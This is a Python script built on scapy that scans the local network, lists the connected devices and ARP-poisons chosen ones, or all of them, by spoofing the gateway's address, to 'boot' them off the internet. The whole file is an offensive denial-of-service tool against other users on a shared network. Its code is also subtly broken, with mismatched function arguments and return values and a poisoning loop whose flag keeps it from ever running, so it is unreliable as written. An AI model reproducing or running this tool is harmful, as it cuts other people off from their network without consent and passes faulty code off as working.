import time
import os
from scapy.all import arping, logging, ARP, send, socket
from threading import Thread

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def get_ip_macs(ips):
  answers, uans = arping(ips, verbose=0)
  res = []
  for answer in answers:
    mac = answer[1].hwsrc
    ip  = answer[1].psrc
    res.append((ip, mac))
  return res

def poison(victim_ip, victim_mac, gateway_ip):
  packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
  send(packet, verbose=0)

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
  packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
  send(packet, verbose=0)

def get_lan_ip():
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.connect(("google.com", 80))
  ip = s.getsockname()
  s.close()
  return ip[0]

def printdiv():
  print("==========")

def menu(gateway_ip):
  gateway_mac = '12:34:56:78:9A:BC'
  print ("Connected ips:")
  devices = get_ip_macs(ip_range)
  i = 0
  for device in devices:
    print ('%s)\t%s\t%s' % (i, device[0], device[1]))
    if device[0] == gateway_ip:
      gateway_mac = device[1]
    i += 1

  printdiv()
  print ('Gateway ip:  %s' % gateway_ip)
  if gateway_mac != '12:34:56:78:9A:BC':
    print ("Gateway mac: %s" % gateway_mac)
  else:
    print ('Gateway not found. Script will be UNABLE TO RESTORE WIFI once shutdown is over')

  print ("Who do you want to boot?")
  print ("(r - Refresh, a - Kill all, q - quit)")
  choice = input("> ")
  return choice, devices, gateway_mac, gateway_ip


import platform
my_os = platform.system()
print("OS in my system : ",my_os)

if (my_os != 'Windows' and os.geteuid() != 0):
  print ("You need to run the script as a superuser")
  exit()

class DeviceThread(Thread):
  def __init__(self, victim_ip, victim_mac, gateway_ip, gateway_mac):
      Thread.__init__(self)
      self.stop_thread = False
      self.victim_ip = victim_ip
      self.victim_mac = victim_mac
      self.gateway_ip = gateway_ip
      self.gateway_mac = gateway_mac
            
  def run(self):
    try:
      while self.stop_thread:
        poison(self.victim_ip, self.victim_mac, self.gateway_ip)
      restore(self.victim_ip, self.victim_mac, self.gateway_ip, self.gateway_mac)
    finally:
      print('Ended')
  
  def stop(self):
    self.stop_thread = False

gateway_mac = '12:34:56:78:9A:BC' # A default (bad) gateway mac address
threads = []

myip = get_lan_ip()
ip_list = myip.split('.')

del ip_list[-1]
ip_list.append('0/24')
ip_range = '.'.join(ip_list)

del ip_list[-1]
ip_list.append('1')
gateway_ip = '.'.join(ip_list)

choice, devices, gateway_mac, gateway_ip = menu(gateway_ip, gateway_mac, threads)

while choice != 'q':
  choice = menu(gateway_ip, gateway_mac)
  if choice.isdigit():
    choice = int(choice)
    victim = devices[choice]
    print ("Preventing %s from accessing the internet..." % victim[0])
    poison_thread = DeviceThread(victim[0], victim[1], gateway_ip, gateway_mac)
    poison_thread.start()
    threads.append(poison_thread)
  elif choice == 'a':
    for victim in devices:
      print ("Preventing %s from accessing the internet..." % victim[0])
      poison_thread = DeviceThread(victim[0], victim[1], gateway_ip, gateway_mac)
      poison_thread.start()
      threads.append(poison_thread)
  elif choice == 'r':
    continue
  elif choice == 'q':
    exit()
  else:
    print("Chose A Valid Option!")